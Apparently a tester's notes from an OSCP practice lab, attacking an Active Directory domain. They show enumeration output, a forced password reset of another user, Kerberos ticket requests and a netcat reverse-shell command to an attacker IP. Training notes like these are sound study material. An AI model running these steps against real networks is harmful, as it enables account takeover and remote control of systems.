NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:02
NSE Timing: About 99.96% done; ETC: 18:03 (0:00:00 remaining)
Completed NSE at 18:03, 40.99s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 3.51s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.01s elapsed
Nmap scan report for 172.16.55.200
Host is up, received user-set (0.11s latency).
Scanned at 2025-12-18 17:47:00 -03 for 997s
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON         VERSION
53/tcp    open  domain        syn-ack ttl 64 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 64 Microsoft Windows Kerberos (server time: 2025-12-18 21:01:55Z)
135/tcp   open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 64
464/tcp   open  kpasswd5?     syn-ack ttl 64
593/tcp   open  ncacn_http    syn-ack ttl 64 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 64
3268/tcp  open  ldap          syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 64
5985/tcp  open  http          syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 64 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 64 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49704/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49743/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=12/18%OT=53%CT=%CU=%PV=Y%G=N%TM=69446C29%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%II=RI%TS=A)
SEQ(SP=FB%GCD=1%ISR=108%TI=I%CI=I%II=RI%TS=A)
OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=40%CD=S)

Uptime guess: 45.838 days (since Sun Nov  2 21:57:17 2025)
TCP Sequence Prediction: Difficulty=251 (Good luck!)
IP ID Sequence Generation: Incrementing by 2
Service Info: Host: DC20; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: DC20, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:54:f5 (VMware)
| Names:
|   DC20<20>             Flags: <unique><active>
|   DC20<00>             Flags: <unique><active>
|   OSCP<00>             Flags: <group><active>
|   OSCP<1c>             Flags: <group><active>
|   OSCP<1b>             Flags: <unique><active>
| Statistics:
|   00:50:56:8a:54:f5:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46186/tcp): CLEAN (Timeout)
|   Check 2 (port 46950/tcp): CLEAN (Timeout)
|   Check 3 (port 54853/udp): CLEAN (Timeout)
|   Check 4 (port 55144/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-12-18T21:02:53
|_  start_date: N/A

TRACEROUTE
HOP RTT       ADDRESS
1   114.57 ms 172.16.55.200

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 997.57 seconds
           Raw packets sent: 197155 (8.678MB) | Rcvd: 1174 (50.484KB)

```

* Sync

```bash
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# ntpdate 172.16.55.200                                       
2025-12-18 18:22:48.312638 (-0300) -0.840070 +/- 0.212657 172.16.55.200 s1 no-leap
CLOCK: time stepped by -0.840070
```

* SMB
```bash
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# smbmap -H 172.16.55.200 -u r.andrews -p 'BusyOfficeWorker890'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 172.16.55.200:445       Name: DC20.oscp.exam            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections   
```

* BOOLDHOUND 

```bash
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# bloodhound-python -u 'r.andrews' -p 'BusyOfficeWorker890' -d oscp.exam -dc dc20.oscp.exam -ns 172.16.55.200 -c all --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: oscp.exam
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc20.oscp.exam
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc20.oscp.exam
INFO: Found 29 users
INFO: Found 62 groups
INFO: Found 8 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WS26.oscp.exam
INFO: Querying computer: SRV22.oscp.exam
INFO: Querying computer: DC20.oscp.exam
INFO: Done in 00M 33S
INFO: Compressing output into 20251218195118_bloodhound.zip
```

```bash
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# bloodyAD --host 172.16.55.200 -d oscp.exam -u 'r.andrews' -p 'BusyOfficeWorker890' set password 'g.jarvis' 'Password123!'
[+] Password changed successfully!
```

```bash
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# nxc winrm 192.168.55.206 -u 'g.jarvis' -p 'Password123!'
WINRM       192.168.55.206  5985   WS26             [*] Windows 11 Build 22621 (name:WS26) (domain:oscp.exam)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.55.206  5985   WS26             [+] oscp.exam\g.jarvis:Password123! (Pwn3d!)
```

```bash
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# nxc smb 172.16.55.202 -u 'g.jarvis' -p 'Password123!'  
SMB         172.16.55.202   445    SRV22            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV22) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         172.16.55.202   445    SRV22            [+] oscp.exam\g.jarvis:Password123!
```

```bash
*Evil-WinRM* PS C:\Users\g.jarvis\Documents> .\Rubeus.exe asktgt /user:g.jarvis /password:'Password123!'

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 2B576ACBE6BCFDA7294D6BD18041B8FE
[*] Building AS-REQ (w/ preauth) for: 'oscp.exam\g.jarvis'
[*] Using domain controller: 172.16.55.200:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFSDCCBUSgAwIBBaEDAgEWooIEZjCCBGJhggReMIIEWqADAgEFoQsbCU9TQ1AuRVhBTaIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJb3NjcC5leGFto4IEJDCCBCCgAwIBEqEDAgECooIEEgSCBA7S06Siu71btRQ7
      9ihsM8g4j/4hqntAM6nbBRMBirxMhgRkmEyzUlocq29c5R1ASh4/Oo2oA9a52gojo+UfDlg2bBG7u2Xp
      J2OAvONIGPahh38MBcREVI7xBrFPEZK3o/Txu4Hi31kIbOShW4hRDBjz1TwLRn1qguJfdhFg22oT4N3F
      XKD8yFVvywBOZJpK7HwmFw18t+tiTLOkViqR1xVT3AkuBZtSL9Sh1DTLlDbjjY9NB1RcQpcFxjWpP5Iu
      cR2OA9NVhmKIGeV/KdakgI6T01nJjyjxkHc8Cxn5vWjOdvd7uOFVa5gXh09q/oZ0GVxql7srYiRlqOOS
      gOOPbCiQYfnRVG74KRLFL4YADIF9CadHquO6+9ra2oOO59GEEeXBjMjvqkKKnx0ib3zjcLtKM4Y/xLIo
      rIiofrxbG1sdTYXg8l1niHYWX20tPUhxh8bQD9lxK/ucLH9HJOlXd0WdOciryPu+y3mAc0pwi21rRN/z
      f9pDqyGjdAvxTss5P5XFpUVYbjbBjznX7bE+QayLRsBbVi6jazQbSzM9sHWtb5PYvs7Yuh41QwHUIiDI
      7EJ4xmtlIlfgceeNHtQEQApkbDbVHANR6Rz94AACmPnAPEJDmYVO76+byXovt+5HOA5s6cUz1i04OlOz
      gSsMNugEk9F7MFAz/uYYoI/0d7hl8CPpW+waUlO+kgkq92Mw817klgKH1uZfbFhmnx8BP1L7zJ+vW+L8
      5RKxu9bMintJFLj+DC1dkO7/8ESA/WYWENbH+YCj8Sj92U/0YL4gkeV5AnfYX1WpWsYokwvkLqZQj8Jv
      65FCCbdFiWF7q8JO0D5Yh56BIvq72ISdL3s8eriVqbJQLEINIB6mmXKLfUTdvae3LIYndcsZuAniDqKA
      I8Q1vXh5GX5TIlsEwEv6v6hH+Kk7kiHQfq09TZmJKfaeEu9xKa2uGNQ3X2Lu18c97Tah/1KmgZGUBQqn
      VhZcO88ABmvwUF/zZGG7AbfB9b3dEJu7xUDtLVZ8np+5dit0e95RU17a/07C0S5QWvkHyd5n0uc7RvY1
      KHxzhImYYJCqLZsoc6EE34fQEdoG21+xwL5l0j0wXPmeAcZUTaYrdUFaZvBPSTzR0F3Jd32qHDofPc8h
      1hSVKHl3Tan6yABITCfbYT4m063+LtK6HQ4pC32lHBXuNsPyLiY9urGxZ9Re0LhuppbU/Ak5KNxSv0Ra
      7ydNHz7PHru3DvQg/8pXy05+/ilP7QWsiRIE4aVGIebKph78AOohvHALu+QTAm+gDowhWlLz4oQLFU0X
      tdVFoB0deago776MK++jTgYCZEIbT3wWQlbXyrFtMVSuyRiFoHiRqKtVX26pJVvymhkMtD7GaZ/InJBV
      Y42l8Vya87ajgc0wgcqgAwIBAKKBwgSBv32BvDCBuaCBtjCBszCBsKAbMBmgAwIBF6ESBBBpN2OB7jAu
      PA7GZa5soZl0oQsbCU9TQ1AuRVhBTaIVMBOgAwIBAaEMMAobCGcuamFydmlzowcDBQBA4QAApREYDzIw
      MjUxMjE5MDA1MjE4WqYRGA8yMDI1MTIxOTEwNTIxOFqnERgPMjAyNTEyMjYwMDUyMThaqAsbCU9TQ1Au
      RVhBTakeMBygAwIBAqEVMBMbBmtyYnRndBsJb3NjcC5leGFt

  ServiceName              :  krbtgt/oscp.exam
  ServiceRealm             :  OSCP.EXAM
  UserName                 :  g.jarvis
  UserRealm                :  OSCP.EXAM
  StartTime                :  12/18/2025 4:52:18 PM
  EndTime                  :  12/19/2025 2:52:18 AM
  RenewTill                :  12/25/2025 4:52:18 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  aTdjge4wLjwOxmWubKGZdA==
  ASREP (key)              :  2B576ACBE6BCFDA7294D6BD18041B8FE
```

**INTETNOS**

```bash
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# nxc smb dc20.oscp.exam -u 'g.jarvis' -p 'Password123!' -d oscp.exam --users   
SMB         172.16.55.200   445    DC20             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC20) (domain:oscp.exam) (signing:True) (SMBv1:False) 
SMB         172.16.55.200   445    DC20             [+] oscp.exam\g.jarvis:Password123! 
SMB         172.16.55.200   445    DC20             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         172.16.55.200   445    DC20             Administrator                 2024-10-09 18:18:45 0       Built-in account for administering the computer/domain 
SMB         172.16.55.200   445    DC20             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         172.16.55.200   445    DC20             krbtgt                        2024-10-09 18:22:44 0       Key Distribution Center Service Account 
SMB         172.16.55.200   445    DC20             c.rogers                      2024-10-09 18:30:52 0       General Administrator                                                                                                         
SMB         172.16.55.200   445    DC20             b.martin                      2024-10-09 18:30:52 0       SQL Admin                                                                                                                     
SMB         172.16.55.200   445    DC20             g.jarvis                      2025-12-19 13:10:26 0       Tech Recruiter                                                                                                                
SMB         172.16.55.200   445    DC20             r.andrews                     2024-10-09 18:30:52 0       System Technician                                                                                                             
SMB         172.16.55.200   445    DC20             a.bailey                      2024-10-09 18:30:52 0       System and IT Team Leader                                                                                                     
SMB         172.16.55.200   445    DC20             c.dean                        2024-10-09 18:30:52 0       General Administrator                                                                                                         
SMB         172.16.55.200   445    DC20             t.fuchs                       2024-10-09 18:30:52 0       Senior SysAdmin 
SMB         172.16.55.200   445    DC20             p.gethin                      2024-10-09 18:30:52 0       Office Assistant 
SMB         172.16.55.200   445    DC20             l.evgeny                      2024-10-09 18:30:52 0       Human Resources 
SMB         172.16.55.200   445    DC20             o.hughes                      2024-10-09 18:30:52 0       Manager 
SMB         172.16.55.200   445    DC20             m.newman                      2024-10-09 18:30:52 0       Project Manager                                                                                                               
SMB         172.16.55.200   445    DC20             s.tucker                      2024-10-09 18:30:52 0       Account Executive                                                                                                             
SMB         172.16.55.200   445    DC20             u.gregory                     2024-10-09 18:30:52 0       FireFly Brand Strategist                                                                                                      
SMB         172.16.55.200   445    DC20             b.williams                    2024-10-09 18:30:52 0       Public Relations                                                                                                              
SMB         172.16.55.200   445    DC20             v.skinner                     2024-10-09 18:30:53 0       Research Analyst                                                                                                              
SMB         172.16.55.200   445    DC20             k.freeman                     2024-10-09 18:30:53 0       Senior UX Designer & UI Developer                                                                                             
SMB         172.16.55.200   445    DC20             j.kole                        2024-10-09 18:30:53 0       Junior SysAdmin Onboard                                                                                                       
SMB         172.16.55.200   445    DC20             w.byrd                        2024-10-09 18:30:53 0       Technical Specialist                                                                                                          
SMB         172.16.55.200   445    DC20             d.hall                        2024-10-09 18:30:53 0       Data Entry                                                                                                                    
SMB         172.16.55.200   445    DC20             e.ddwards                     2024-10-09 18:30:53 0       Chief Information Officer 
SMB         172.16.55.200   445    DC20             b.cross                       2024-10-09 18:30:53 0       Sales Manager 
SMB         172.16.55.200   445    DC20             r.gallagher                   2024-10-09 18:30:53 0       Travel Associate 
SMB         172.16.55.200   445    DC20             s.fischer                     2024-10-09 18:30:53 0       Founder 
SMB         172.16.55.200   445    DC20             f.hatfield                    2024-10-09 18:30:53 0       Receptionist 
SMB         172.16.55.200   445    DC20             v.perry                       2024-10-09 18:30:53 0       Receptionist 
SMB         172.16.55.200   445    DC20             [*] Enumerated 28 local users: OSCP


┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# nxc smb dc20.oscp.exam -u 'g.jarvis' -p 'Password123!' -d oscp.exam --shares
SMB         172.16.55.200   445    DC20             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC20) (domain:oscp.exam) (signing:True) (SMBv1:False) 
SMB         172.16.55.200   445    DC20             [+] oscp.exam\g.jarvis:Password123! 
SMB         172.16.55.200   445    DC20             [*] Enumerated shares
SMB         172.16.55.200   445    DC20             Share           Permissions     Remark
SMB         172.16.55.200   445    DC20             -----           -----------     ------
SMB         172.16.55.200   445    DC20             ADMIN$                          Remote Admin
SMB         172.16.55.200   445    DC20             C$                              Default share
SMB         172.16.55.200   445    DC20             IPC$            READ            Remote IPC
SMB         172.16.55.200   445    DC20             NETLOGON        READ            Logon server share 
SMB         172.16.55.200   445    DC20             SYSVOL          READ            Logon server share 

```

```bash
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# ldapsearch -x -H ldap://dc20.oscp.exam -b "dc=oscp,dc=exam" "(objectClass=user)" sAMAccountName cn displayName -LLL
ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)
                                                                                                                                                                                                                                            
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# impacket-GetUserSPNs -request -dc-ip 172.16.55.200 -outputfile kerberostables.txt oscp.exam/g.jarvis:'Password123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] [Errno 110] Connection timed out

```

```bash
*Evil-WinRM* PS C:\Users\g.jarvis\Documents> runas /user:Administrator "C:\Users\g.jarvis\Documents\nc.exe 192.168.49.55 4445 -e cmd.exe"
Enter the password for Administrator:
*Evil-WinRM* PS C:\Users\g.jarvis\Documents> 
```

**PROBLEMAS**

```bash
*Evil-WinRM* PS C:\Users\g.jarvis\Documents> Set-ExecutionPolicy RemoteSigned –Scope Process
*Evil-WinRM* PS C:\Users\g.jarvis\Documents> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\g.jarvis\Documents> Get-DomainUser | select samaccountname
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.                                                                                                                                                            
"                                                                                                                                                                                                                                           
At C:\Users\g.jarvis\Documents\PowerView.ps1:5253 char:20                                                                                                                                                                                   
+             else { $Results = $UserSearcher.FindAll() }                                                                                                                                                                                   
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                                                                                                                                     
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException                                                                                                                                                               
    + FullyQualifiedErrorId : DirectoryServicesCOMException                                                                                                                                                                                 
*Evil-WinRM* PS C:\Users\g.jarvis\Documents> 
```

